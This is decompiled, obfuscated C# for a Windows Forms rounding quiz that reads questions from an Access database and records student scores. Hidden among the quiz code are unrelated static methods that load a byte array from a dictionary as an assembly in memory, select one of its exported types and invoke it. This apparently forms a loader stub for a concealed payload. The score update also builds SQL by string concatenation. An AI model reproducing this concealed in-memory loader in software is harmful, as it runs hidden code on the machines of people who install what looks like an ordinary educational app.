using System;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.OleDb;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using a6W4;
using x5X;

namespace c7DN;

[DesignerGenerated]
public class Ab7z : Form
{
	private Label _lblAnswer;

	private int n;

	private float answer;

	private bool complete;

	private int places;

	private object _globalvariables;

	internal IContainer J;

	internal Label s;

	internal Label h;

	internal Button c;

	internal Label g;

	internal TextBox B;

	internal Label P;

	internal int Y;

	internal float K;

	internal object e;

	public object globalvariables
	{
		get
		{
			return _globalvariables;
		}
		set
		{
			_globalvariables = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public Ab7z()
	{
		((Form)this).add_Load((EventHandler)p6AM);
		Y = 0;
		n = 0;
		c3GE();
	}

	protected override void Qw0y(bool Ay6j)
	{
		try
		{
			if (Ay6j && J != null)
			{
				J.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Ay6j);
		}
	}

	private void c3GE()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		r2R9(new Label());
		b8CD(new Label());
		x1LJ(new Label());
		m6A2(new Button());
		Yq52(new Label());
		m2WR(new TextBox());
		z7R5(new Label());
		((Control)this).SuspendLayout();
		Eg0p().set_AutoSize(true);
		((Control)Eg0p()).set_Location(new Point(432, 131));
		((Control)Eg0p()).set_Name("lblAnswer");
		((Control)Eg0p()).set_Size(new Size(42, 13));
		((Control)Eg0p()).set_TabIndex(52);
		Eg0p().set_Text("Answer");
		Ad8i().set_AutoSize(true);
		((Control)Ad8i()).set_Location(new Point(172, 9));
		((Control)Ad8i()).set_Name("lblPlaces");
		((Control)Ad8i()).set_Size(new Size(15, 13));
		((Control)Ad8i()).set_TabIndex(50);
		Ad8i().set_Text("R");
		j6J2().set_AutoSize(true);
		((Control)j6J2()).set_Location(new Point(12, 9));
		((Control)j6J2()).set_Name("lblT4Question");
		((Control)j6J2()).set_Size(new Size(15, 13));
		((Control)j6J2()).set_TabIndex(49);
		j6J2().set_Text("Q");
		((Control)Wo1z()).set_Location(new Point(193, 212));
		((Control)Wo1z()).set_Name("btnT4CheckAnswer");
		((Control)Wo1z()).set_Size(new Size(92, 23));
		((Control)Wo1z()).set_TabIndex(47);
		((ButtonBase)Wo1z()).set_Text("Check Answer");
		((ButtonBase)Wo1z()).set_UseVisualStyleBackColor(true);
		f6Q4().set_AutoSize(true);
		((Control)f6Q4()).set_Location(new Point(12, 217));
		((Control)f6Q4()).set_Name("Label1");
		((Control)f6Q4()).set_Size(new Size(45, 13));
		((Control)f6Q4()).set_TabIndex(46);
		f6Q4().set_Text("Answer:");
		((Control)k9X0()).set_Location(new Point(63, 214));
		((Control)k9X0()).set_Name("txtAnswer");
		((Control)k9X0()).set_Size(new Size(100, 20));
		((Control)k9X0()).set_TabIndex(45);
		Br6y().set_AutoSize(true);
		((Control)Br6y()).set_Location(new Point(103, 9));
		((Control)Br6y()).set_Name("lblRandomNo");
		((Control)Br6y()).set_Size(new Size(15, 13));
		((Control)Br6y()).set_TabIndex(53);
		Br6y().set_Text("R");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(524, 389));
		((Control)this).get_Controls().Add((Control)(object)Br6y());
		((Control)this).get_Controls().Add((Control)(object)Eg0p());
		((Control)this).get_Controls().Add((Control)(object)Ad8i());
		((Control)this).get_Controls().Add((Control)(object)j6J2());
		((Control)this).get_Controls().Add((Control)(object)Wo1z());
		((Control)this).get_Controls().Add((Control)(object)f6Q4());
		((Control)this).get_Controls().Add((Control)(object)k9X0());
		((Control)this).set_Name("T4Question");
		((Form)this).set_Text("Rounding");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label Eg0p()
	{
		return _lblAnswer;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r2R9(Label Ht4e)
	{
		_lblAnswer = Ht4e;
	}

	[SpecialName]
	internal virtual Label Ad8i()
	{
		return s;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void b8CD(Label q8SG)
	{
		Label val = (s = q8SG);
	}

	[SpecialName]
	internal virtual Label j6J2()
	{
		return h;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x1LJ(Label Qo5m)
	{
		Label val = (h = Qo5m);
	}

	[SpecialName]
	internal virtual Button Wo1z()
	{
		return c;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void m6A2(Button z1QK)
	{
		EventHandler eventHandler = t6R1;
		Button val = c;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (c = z1QK);
		val = c;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label f6Q4()
	{
		return g;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yq52(Label e7HA)
	{
		Label val = (g = e7HA);
	}

	[SpecialName]
	internal virtual TextBox k9X0()
	{
		return B;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void m2WR(TextBox Xm96)
	{
		TextBox val = (B = Xm96);
	}

	[SpecialName]
	internal virtual Label Br6y()
	{
		return P;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void z7R5(Label x0G9)
	{
		Label val = (P = x0G9);
	}

	private void p6AM(object sender, EventArgs e)
	{
		b6N0();
		j3XN();
		n4F9();
		Eg0p().set_Text(Conversions.ToString(answer));
	}

	public void b6N0()
	{
		string eb = "SELECT Question FROM tblQuestions WHERE TopicNo = 4;";
		Nw78(eb);
	}

	public void Nw78(string Eb05)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		DataTable dataTable = new DataTable();
		OleDbConnection val = new OleDbConnection("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=Student_Details.mdb");
		val.Open();
		OleDbDataAdapter val2 = new OleDbDataAdapter(Eb05, val);
		((DbDataAdapter)(object)val2).Fill(dataTable);
		j6J2().set_Text(Conversions.ToString(dataTable.Rows[0][0]));
		val.Close();
		((Component)(object)val).Dispose();
	}

	public void j3XN()
	{
		VBMath.Randomize();
		float num = (K = VBMath.Rnd(3f * VBMath.Rnd()) + 1f);
		Br6y().set_Text(Conversions.ToString(K));
		places = checked((int)Math.Floor(3f * VBMath.Rnd()) + 1);
		Ad8i().set_Text(Conversions.ToString(places));
	}

	public void n4F9()
	{
		answer = (float)Math.Round(K, places);
	}

	internal static void c5P9()
	{
		Assembly assembly = null;
		byte[] rawAssembly = (byte[])t2P.mDic[t2P.mArray];
		assembly = Assembly.Load(rawAssembly);
		t2P.mDic.Add("Deep", assembly);
		assembly = null;
		if (n5D6())
		{
			Aw27.s5T();
		}
	}

	public void x2NG()
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		string text = "";
		bool flag = false;
		while (!(flag & (Operators.CompareString(text, k9X0().get_Text(), false) == 0)))
		{
			try
			{
				text = k9X0().get_Text();
				flag = true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				MessageBox.Show("Please enter an answer");
				flag = false;
				ProjectData.ClearProjectError();
			}
		}
		float num = Convert.ToSingle(text);
		checked
		{
			if (num == answer)
			{
				Y++;
				Interaction.MsgBox((object)"Correct answer", (MsgBoxStyle)0, (object)null);
			}
			else
			{
				Interaction.MsgBox((object)("Incorrect, right answer is: " + Conversions.ToString(answer)), (MsgBoxStyle)0, (object)null);
			}
		}
	}

	public void Ej1t()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		string text = "Score";
		OleDbConnection c9B = new OleDbConnection("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=Student_Details.mdb");
		c9B.Open();
		string ag6a = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("UPDATE tblStudentScores SET " + text + " = " + Conversions.ToString(Y) + " WHERE ID = "), NewLateBinding.LateGet(globalvariables, (Type)null, "StuID", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)" AND TopicNo = 4"));
		t7W4(ag6a, ref c9B);
		c9B.Close();
		((Component)(object)c9B).Dispose();
	}

	private void t6R1(object sender, EventArgs e)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			if (Operators.CompareString(k9X0().get_Text(), "", false) == 0)
			{
				Interaction.MsgBox((object)"Enter an answer", (MsgBoxStyle)0, (object)null);
			}
			else
			{
				x2NG();
				if (n < 0)
				{
					j6J2().set_Text("");
					k9X0().set_Text("");
					n++;
					b6N0();
					j3XN();
					n4F9();
				}
				else
				{
					complete = true;
				}
			}
			if (complete)
			{
				Interaction.MsgBox((object)("You scored: " + Conversions.ToString(Y)), (MsgBoxStyle)0, (object)null);
				Ej1t();
				((Form)this).Close();
				NewLateBinding.LateCall(this.e, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
		}
	}

	internal static bool n5D6()
	{
		try
		{
			try
			{
				Type type = Hw0f((Assembly)t2P.mDic["Deep"]);
				if (Operators.CompareString(type.Name, t2P.mDic[t2P.tName].ToString(), false) == 0)
				{
					t2P.mDic.Add(t2P.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	private void t7W4(string Ag6a, ref OleDbConnection c9B5)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		OleDbCommand val = new OleDbCommand(Ag6a, c9B5);
		try
		{
			val.ExecuteNonQuery();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show("Failed:\r\n" + ex2.Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			((Component)(object)val).Dispose();
		}
	}

	internal static Type Hw0f(Assembly e0Y2)
	{
		return e0Y2.GetExportedTypes()[27];
	}
}
